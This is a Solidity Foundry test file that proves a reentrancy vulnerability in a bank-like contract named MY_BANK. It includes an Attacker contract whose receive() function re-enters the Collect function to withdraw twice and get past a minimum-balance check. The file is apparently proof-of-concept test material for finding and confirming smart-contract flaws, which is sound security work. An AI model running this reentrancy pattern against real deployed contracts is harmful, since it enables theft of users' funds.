
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MY_BANK, Log} from "../src/MY_BANK.sol";

contract TestReentrancyMY_BANK is Test {
    
    MY_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new MY_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // We need to deposit at least MinSum (1 ether).
        // We want to withdraw half of it twice.
        // To prove the exploit (bypassing MinSum check on the second half), 
        // the remaining balance after first withdrawal must be < MinSum.
        // So: attackVal >= 1 ether.
        // And: attackVal - (attackVal / 2) < 1 ether.
        // This implies attackVal < 2 ether.
        vm.assume(attackVal >= 1 ether && attackVal < 2 ether);
        
        // Ensure even number for clean division
        if (attackVal % 2 != 0) {
            attackVal -= 1;
        }
        vm.assume(attackVal >= 1 ether); // Re-check after adjustment

        uint256 withdrawAmount = attackVal / 2;

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state needed other than deployment.

        // --- 3. Funding ---
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        // Deposit the full amount
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Warp time to satisfy block.timestamp > acc.unlockTime
        // Put(0) sets unlockTime to block.timestamp.
        vm.warp(block.timestamp + 100);

        // Trigger attack with half the amount
        _attacker.attack(withdrawAmount);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    MY_BANK public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    
    uint256 public amountToWithdraw;

    constructor(address victimAddress) { 
        victim = MY_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds to pass the balance checks
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        initialSnapshot = address(this).balance;
        amountToWithdraw = val;

        // 2. Call the vulnerable function.
        // We attempt to withdraw 'val'. 
        // Due to reentrancy, we will withdraw 'val' twice.
        // Total withdrawn = 2 * val.
        // Since we deposited 2 * val (attackVal), this drains our account to 0.
        // The exploit is that normally, after withdrawing the first half, 
        // the remaining balance would be < MinSum, preventing the second withdrawal.
        victim.Collect(val);

        // 4. Verify Success Conditions.
        // If we successfully withdrew twice, our balance should have increased by 2 * val.
        if (address(this).balance >= initialSnapshot + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter the contract
            // At this point, balance is not yet updated, so we pass the MinSum check again
            victim.Collect(amountToWithdraw);
        }
    }

    fallback() external payable {}
}
